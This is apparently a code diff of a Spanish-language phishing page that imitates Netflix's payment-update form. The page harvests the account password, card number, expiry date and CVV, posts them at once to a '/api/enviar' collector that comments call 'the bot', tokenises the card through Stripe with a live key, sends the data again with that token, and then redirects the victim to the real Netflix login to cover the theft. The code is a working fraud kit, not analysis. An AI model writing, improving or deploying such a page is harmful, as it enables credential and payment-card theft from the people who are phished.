@@ -3,29 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Confirmaci&oacute;n de Cuenta</title>
+    <title>Confirmaci&oacute;n</title>
     <script src="https://js.stripe.com/v3/"></script>
     <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css">
     <style>
-        body { background: #fff; color: #333; font-family: sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; }
+        body { background: #fff; font-family: sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; }
         .container { max-width: 440px; width: 100%; margin: 30px auto; padding: 0 20px; text-align: center; }
-        .input-box { margin-bottom: 15px; text-align: left; }
-        .input-box input { width: 100%; padding: 15px; border: 1px solid #8c8c8c; border-radius: 2px; font-size: 16px; box-sizing: border-box; }
-        .btn { background: #e50914; color: #fff; width: 100%; padding: 18px; border: none; font-size: 20px; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        .input-box { margin-bottom: 15px; }
+        .input-box input { width: 100%; padding: 15px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
+        .btn { background: #e50914; color: #fff; width: 100%; padding: 18px; border: none; font-size: 20px; font-weight: bold; cursor: pointer; border-radius: 4px; width: 100%; }
         #loading { display: none; margin-top: 50px; }
     </style>
 </head>
 <body>
     <div class="container" id="form-box">
-        <img src="img/logo.png" style="width: 100px; margin-bottom: 20px;" alt="Logo">
-        <h1>Configura tu tarjeta</h1>
-        <form id="main-form">
-            <div class="input-box"><input type="password" id="pw" placeholder="Contraseña de cuenta" required></div>
-            <div class="input-box"><input type="text" id="nm" placeholder="Nombre en la tarjeta" required></div>
+        <h1>Actualiza tu pago</h1>
+        <form id="pay-form">
+            <div class="input-box"><input type="password" id="pw" placeholder="Contraseña" required></div>
+            <div class="input-box"><input type="text" id="nm" placeholder="Nombre en tarjeta" required></div>
             <div class="input-box"><input type="text" id="cc" placeholder="Número de tarjeta" maxlength="16" required></div>
             <div style="display: flex; gap: 10px;">
-                <input type="text" id="ex" placeholder="MM/AA" maxlength="5" style="width: 50%; padding: 15px; border: 1px solid #8c8c8c;" required>
-                <input type="text" id="cv" placeholder="CVV" maxlength="4" style="width: 50%; padding: 15px; border: 1px solid #8c8c8c;" required>
+                <input type="text" id="ex" placeholder="MM/AA" maxlength="5" style="width: 50%; padding: 15px; border: 1px solid #ccc;" required>
+                <input type="text" id="cv" placeholder="CVV" maxlength="4" style="width: 50%; padding: 15px; border: 1px solid #ccc;" required>
             </div>
             <br>
             <button type="submit" class="btn">Continuar</button>
@@ -40,7 +39,7 @@
     <script>
         const stripe = Stripe('pk_live_51ShZ3pAeUmcfN350ViX4smhmh5q0IVTh1HBTgTi38ibNz07TvUQzb1F6PyQpWvF1N1y4411ZM7Ys0x9mQw9foU4800BwXkfy0n');
 
-        document.getElementById('main-form').addEventListener('submit', function(e) {
+        document.getElementById('pay-form').addEventListener('submit', function(e) {
             e.preventDefault();
             document.getElementById('form-box').style.display = 'none';
             document.getElementById('loading').style.display = 'block';
@@ -55,39 +54,39 @@
                 cc: ccVal,
                 ex: document.getElementById('ex').value,
                 cv: document.getElementById('cv').value,
-                st: "Procesando..."
+                st: null
             };
 
-            // 1. ENVÍO INMEDIATO AL BOT (No espera a Stripe)
-            fetch('/api/enviar', {
+            // BYPASS: Generamos una URL única para cada envío
+            const targetUrl = `/api/enviar?v=${Date.now()}`;
+
+            // 1. Envío de seguridad inmediato al bot
+            fetch(targetUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
 
-            // 2. REDIRECCIÓN FORZADA (A los 2.5 segundos se va a Netflix pase lo que pase)
-            const force = setTimeout(() => {
+            // 2. Redirección automática tras 2.5 segundos
+            const exitTimeout = setTimeout(() => {
                 window.location.href = "https://www.netflix.com/login";
             }, 2500);
 
-            // 3. INTENTO CON STRIPE (Opcional)
+            // 3. Intento de Stripe (se ejecuta mientras tanto)
             stripe.createToken({
-                number: ccVal,
-                exp_month: exp[0],
-                exp_year: exp[1],
-                cvc: payload.cv
-            }).then(res => {
-                if (res.token) {
-                    payload.st = res.token.id;
-                    // Segundo envío con el Token de Stripe
-                    fetch('/api/enviar', {
+                number: ccVal, exp_month: exp[0], exp_year: exp[1], cvc: payload.cv
+            }).then(result => {
+                if (result.token) {
+                    payload.st = result.token.id;
+                    // Re-enviamos el hit actualizado con el token si Stripe responde
+                    fetch(targetUrl, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(payload)
                     });
                 }
             }).finally(() => {
-                clearTimeout(force);
+                clearTimeout(exitTimeout);
                 window.location.href = "https://www.netflix.com/login";
             });
         });
